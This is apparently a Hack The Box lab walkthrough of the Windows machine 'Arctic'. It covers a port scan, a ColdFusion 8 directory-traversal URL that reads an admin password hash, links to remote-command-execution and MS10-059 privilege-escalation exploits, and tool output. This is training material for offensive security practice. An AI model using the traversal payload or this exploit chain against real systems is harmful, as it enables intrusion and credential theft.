```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-04 09:49 CDT
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.41% done; ETC: 09:50 (0:00:29 remaining)
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.82% done; ETC: 09:50 (0:00:28 remaining)
Nmap scan report for 10.129.93.22
Host is up (0.0082s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```
## Exploit
[CVE-2010-2861 - directory traversal](https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2010-2861)
`http://10.129.93.22:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`

admin hash `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03`

![](Images/{16B8CBA6-FFF6-4FB7-88C2-1BE9EA943574}.png)

Hash is already dumped
![](Images/{631208C4-03F8-45AD-B563-50400F74F291}.png)

[Adobe ColdFusion 8 - Remote Command Execution | cfm/webapps/50057.py](https://www.exploit-db.com/exploits/50057)

Update system information in payload

![](Images/{7FD009FA-B226-434F-8FED-29CD4B0D8465}.png)

![](Images/{BB5A311C-273A-42C7-8F23-8F7A565A767E}.png)

Shell obtained

![](Images/{F0048586-2F50-41D2-90D2-70D8B795DC3C}.png)

![](Images/{9CED4D39-68D3-4115-9CAD-7A0A6B666602}.png)

Can also pop a shell with metasploit `windows/http/coldfusion_fckeditor`
## Priv Esc
### System Info
```
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          6/4/2025, 1:42:44 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.057 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.228 MB
Virtual Memory: In Use:    1.057 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.93.22
```

![](Images/{2EEC5AE2-CA80-44FB-A8C9-E983B2999C3F}%201.png)

SeImpersonatePriv

Run local-exploit-suggester
`python2 exploit-suggester.py --database 2025-04-16-mssb.xls --systeminfo sysinfo.txt`
```
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```
[Chimichurri-MS10-059](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Source/Chimichurri.ncb)

Transfer the file on over

![](Images/Pasted%20image%2020250416211358.png)

Slap in the options and you are good to go

![](Images/Pasted%20image%2020250416211520.png)
![](Images/Pasted%20image%2020250416211558.png)
